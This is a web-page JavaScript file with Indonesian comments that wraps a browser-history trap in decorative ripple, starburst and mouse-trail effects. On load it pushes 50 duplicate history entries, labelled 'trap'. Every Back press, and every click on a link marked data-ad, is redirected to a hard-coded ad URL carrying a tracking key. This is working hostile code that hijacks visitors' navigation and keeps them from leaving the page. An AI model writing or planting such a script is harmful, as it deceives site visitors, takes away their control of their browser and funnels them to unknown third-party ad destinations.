// ====== Configuration ======
const AD_URL = "https://momrollback.com/bdpy98sd?key=ec433767b4f75131a24f0e5fd35f6f4d"; 
const HISTORY_PUSH_COUNT = 50; 

// ====== Initialize Everything ======
window.addEventListener('load', function() {
  safePushStates(HISTORY_PUSH_COUNT);
  // createStars(); // Dihapus: Efek kosmik dihilangkan
  // createShootingStars(); // Dihapus: Efek kosmik dihilangkan
  // createCosmicRays(); // Dihapus: Efek kosmik dihilangkan
  initializeButtons();
});

// ====== History Management (Fungsi Asli Dipertahankan) ======
function safePushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({trap:i}, "", location.href); 
    } catch(e) { 
      console.log('Push state blocked'); 
    }
  }
}

// ====== Redirect Logic (Fungsi Asli Dipertahankan) ======
function goToAdImmediate() {
  safePushStates(HISTORY_PUSH_COUNT);
  window.location.href = AD_URL;
}

// ====== Button Initialization (Fungsi Asli Dipertahankan) ======
function initializeButtons() {
  document.querySelectorAll('a[data-ad="true"]').forEach(button => {
    button.addEventListener('click', function(e) {
      e.preventDefault();
      createRipple(this, e);
      createStarburst(this);
      
      setTimeout(() => { 
        goToAdImmediate(); 
      }, 400);
    });
  });
}

// ====== Popstate Handler (Fungsi Asli Dipertahankan) ======
window.addEventListener('popstate', function() {
  window.location.href = AD_URL;
});

// ====== Galaxy Background Effects - KODE DIBAWAH INI DIHAPUS (Tidak perlu karena elemen di CSS di-display: none)
// function createStars() { ... }
// function createShootingStars() { ... }
// function createCosmicRays() { ... }

// ====== Ripple Effect (Fungsi Asli Dipertahankan) ======
function createRipple(element, event) {
  const rect = element.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  
  const ripple = document.createElement('span');
  ripple.className = 'ripple';
  ripple.style.left = x + 'px';
  ripple.style.top = y + 'px';
  
  element.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}

// ====== Starburst Effect (Warna disesuaikan ke tema netral) ======
function createStarburst(button) {
  const rect = button.getBoundingClientRect();
  const centerX = rect.left + rect.width / 2;
  const centerY = rect.top + rect.height / 2;
  
  // Warna diubah menjadi netral/primer
  const colors = ['#007BFF', '#6C757D', '#ADB5BD', '#343A40']; 
  
  for (let i = 0; i < 10; i++) {
    const particle = document.createElement('div');
    const angle = (i * 36) * Math.PI / 180;
    const distance = 60;
    
    particle.style.position = 'fixed';
    particle.style.width = '4px';
    particle.style.height = '4px';
    particle.style.backgroundColor = colors[i % colors.length];
    particle.style.borderRadius = '50%';
    particle.style.left = centerX + 'px';
    particle.style.top = centerY + 'px';
    particle.style.zIndex = '100';
    particle.style.pointerEvents = 'none';
    particle.style.boxShadow = `0 0 8px ${colors[i % colors.length]}`;
    
    document.body.appendChild(particle);
    
    const animation = particle.animate([
      { 
        transform: 'translate(0, 0) scale(1)', 
        opacity: 1 
      },
      { 
        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, 
        opacity: 0 
      }
    ], {
      duration: 600,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });
    
    animation.onfinish = () => particle.remove();
  }
}

// ====== Mouse Trail Effect (Warna disesuaikan ke tema netral dan opasitas dikurangi) ======
document.addEventListener('mousemove', function(e) {
  // Hanya buat debu di sekitar tombol atau di area tertentu (dipertahankan dari kode asli)
  if (Math.random() > 0.9) { 
    createSpaceDust(e.clientX, e.clientY);
  }
});

function createSpaceDust(x, y) {
  const dust = document.createElement('div');
  dust.style.position = 'fixed';
  dust.style.width = '2px';
  dust.style.height = '2px';
  dust.style.backgroundColor = '#ADB5BD'; // Warna abu-abu netral
  dust.style.borderRadius = '50%';
  dust.style.left = x + 'px';
  dust.style.top = y + 'px';
  dust.style.zIndex = '5';
  dust.style.pointerEvents = 'none';
  dust.style.boxShadow = '0 0 6px rgba(173, 181, 189, 0.5)';
  
  document.body.appendChild(dust);
  
  const animation = dust.animate([
    { transform: 'scale(1)', opacity: 1 },
    { transform: 'scale(0)', opacity: 0 }
  ], {
    duration: 800,
    easing: 'ease-out'
  });
  
  animation.onfinish = () => dust.remove();
}

// ====== Auto Cosmic Events - DIHAPUS (Tidak perlu untuk tema profesional)
/*
setInterval(() => {
  if (Math.random() > 0.7) {
    createNebulaFlash();
  }
}, 6000);

function createNebulaFlash() {
  const flash = document.createElement('div');
  // ... (kode nebula flash)
  
  animation.onfinish = () => flash.remove();
}
*/


